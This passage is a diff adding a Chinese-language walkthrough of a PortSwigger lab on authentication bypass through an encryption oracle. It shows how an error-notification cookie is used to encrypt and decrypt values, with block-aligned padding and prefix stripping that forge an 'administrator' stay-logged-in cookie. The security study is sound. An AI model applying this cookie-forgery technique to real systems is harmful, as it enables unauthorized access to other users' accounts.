@@ -325,6 +325,37 @@ async function main() {
 
 然後這題的 update email 功能，還有 Email Client 都是 "紅鯡魚謬誤"
 
+## Lab: Authentication bypass via encryption oracle
+
+| Dimension | Description                                                                                                           |
+| --------- | --------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle                              |
+| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle |
+
+這題輸入錯誤的 email，會在 cookie 設定 notification
+
+Invalid email address: 1 => ysLPLLvJF438cPQamdAP8FdK%2bskruZkjAdamzQGqzqA%3d
+
+把 stay-logged-in: rZWe%2fD3rM7ewYxd744A6UeFy1D655dKtwnLESo2EiBg%3d 的 value 塞回 notification 後，得知格式為 `wiener:1760445014612`
+
+Invalid email address: 456789012administrator:1760446048111
+ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjmEcS+AQsP/hyhXKs8T2oSJ2FpBVFc/BdEpgvhzfaF9cQ==
+CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A3984712F8042C3FF8728572ACF13DA8489D85A4154573F05D12982F8737DA17D71
+
+Invalid email address: 4567890121
+ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjkJSrs/rqcbtwEe865pxb7D
+CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A39094ABB3FAEA71BB7011EF3AE69C5BEC3
+
+Invalid email address: 4567890122
+ysLPLLvJF438cPQamdAP8AaL/f331brhCpNccoDZWjkeEeltnyvl4G7WWk2E2TSi
+CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A391E11E96D9F2BE5E06ED65A4D84D934A2
+
+CAC2CF2CBBC9178DFC70F41A99D00FF0068BFDFDF7D5BAE10A935C7280D95A39 => 移除一樣的部分，剛好是 64 個 HEX
+
+84712F8042C3FF8728572ACF13DA8489D85A4154573F05D12982F8737DA17D71 => 把這個重新 Base64 Encode => hHEvgELD/4coVyrPE9qEidhaQVRXPwXRKYL4c32hfXE=
+
+貼回 notification 驗證，確定解出來是 administrator:1760446048111，成功通關～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/host-header
